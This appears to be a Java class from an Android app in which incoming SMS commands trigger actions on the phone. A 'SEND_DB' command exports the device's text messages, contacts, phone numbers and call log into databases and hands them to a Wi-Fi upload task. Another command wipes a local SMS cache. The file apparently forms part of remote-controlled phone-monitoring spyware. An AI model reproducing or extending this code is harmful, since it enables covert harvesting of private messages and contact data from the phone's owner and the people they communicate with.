package org.gdocument.gchattoomuch.p2p.client.business;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;

import org.gdocument.gchattoomuch.lib.parser.SmsParser;
import org.gdocument.gchattoomuch.lib.parser.SmsParser.MSG_TYPE;
import org.gdocument.gchattoomuch.p2p.client.db.helper.DBContentProviderHelper;
import org.gdocument.gchattoomuch.p2p.client.db.helper.DBSmsCacheHelper;
import org.gdocument.gchattoomuch.p2p.client.db.service.DbSmsCacheService;
import org.gdocument.gchattoomuch.p2p.client.task.WifiDatabaseUploadTask;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.Context;
import android.database.sqlite.SQLiteOpenHelper;
import android.os.Handler;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds;

import com.cameleon.common.android.inotifier.INotifierMessage;


public class MessageTypeBusiness {

	private static final String TAG = MessageTypeBusiness.class.getName();
	private Context context;

	public enum CONTENT_PROVIDER {
		SMS("content://sms/", "SMS", "sms.db"),
		CONTACT(ContactsContract.Data.CONTENT_URI.toString(), "CONTACT", "contact.db"),
		PHONE(CommonDataKinds.Phone.CONTENT_URI.toString(), "PHONE", "phone.db"),
		CALL(Calls.CONTENT_URI.toString(), "CALL", "call.db"),
		SMS_CACHE(null, DBSmsCacheHelper.TABLE_NAME, DBSmsCacheHelper.DATABASE_NAME);

		public String url;
		public String tableName;
		public String databaseName;

		CONTENT_PROVIDER(String url, String tableName, String databaseName) {
			this.url = url;
			this.tableName = tableName;
			this.databaseName = databaseName;
		}
	};

	private CONTENT_PROVIDER[] contentProvider = CONTENT_PROVIDER.values();
	private INotifierMessage notifier;

	public MessageTypeBusiness(Context context) {
		this.context = context;
	}

	public MessageTypeBusiness(Context context, INotifierMessage notifier) {
		this.context = context;
		this.notifier = notifier;
	}

	public boolean processMessage(Handler handler, String phoneNumber, String message) {
		MSG_TYPE msgType = SmsParser.getInstance().getMessageType(message);
		return processMessage(handler, msgType, phoneNumber, message);
	}

	public boolean processMessage(Handler handler, MSG_TYPE msgType, String phoneNumber, String message) {
		boolean ret = false;
		switch(msgType) {
			case CLEAN_DB_SMS:
				processCleanDbSms();
				ret = true;
				break;
			case SEND_DB:
				processSendDb(handler);
				ret = true;
				break;
			default:
				int len = (message.length() > 20 ? 20 : message.length());
				logMe("Unknowed from:" + phoneNumber + " message:" + message.substring(0, len/2) + "..." + message.substring(message.length()-(len-(len/2))));
		}
		return ret;
	}

	private void processCleanDbSms() {
//		for(CONTENT_PROVIDER provider : contentProvider) {
//			logMe("processCleanDbSms contentProvider:" + provider);
//			new DbContentProviderService(context, null, provider).deleteAll();
//		}
		new DbSmsCacheService(context, null).deleteAll();
	}

	private void processSendDb(Handler handler) {
		Map<CONTENT_PROVIDER, SQLiteOpenHelper> mapHelper = initializeSQLiteHelperSynchrozed(handler);

		List<String> databaseNameList = new ArrayList<String>();

		for(CONTENT_PROVIDER provider : contentProvider) {
			if (provider.url != null) {
				CountDownLatch latch = null;//new CountDownLatch(1);
				new ContentProviderExportBusiness(notifier).export(handler, context, provider, latch);
//				latch.await();
			}
			SQLiteOpenHelper helper = mapHelper.get(provider);
			if (helper != null) {
				String path = helper.getReadableDatabase().getPath();
				if (!databaseNameList.contains(path)) {
					databaseNameList.add(path);
				}
			}
		}

		databaseNameList.add(new DBSmsCacheHelper(context, null).getReadableDatabase().getPath());

		new WifiDatabaseUploadTask(context, notifier, databaseNameList).execute();
	}

	private Map<CONTENT_PROVIDER, SQLiteOpenHelper> initializeSQLiteHelperSynchrozed (Handler handler) {
		final Map<CONTENT_PROVIDER, SQLiteOpenHelper> mapHelper = new HashMap<CONTENT_PROVIDER, SQLiteOpenHelper>();
		final CountDownLatch latchData = new CountDownLatch(1);
		try {
			handler.post(new Runnable() {
				
				@Override
				public void run() {
					for(CONTENT_PROVIDER provider : contentProvider) {
						if (provider.url != null) {
							mapHelper.put(provider, new DBContentProviderHelper(context, notifier, provider));
						}
						mapHelper.put(CONTENT_PROVIDER.SMS_CACHE, new DBSmsCacheHelper(context, notifier));
					}
					latchData.countDown();
				}
			});
			latchData.await();
		} catch (InterruptedException e) {
			logMe(e);
		}
		return mapHelper;
	}

	private void notify(String message) {
		if (notifier != null) {
			notifier.notifyMessage(message);
		}
	}

	private void notify(Exception ex) {
		if (notifier != null) {
			notifier.notifyError(ex);
		}
	}

	private void logMe(String message) {
		Logger.logMe(TAG, message);
		notify(message);
	}

	private void logMe(Exception ex) {
		Logger.logMe(TAG, ex);
		notify(ex);
    }
}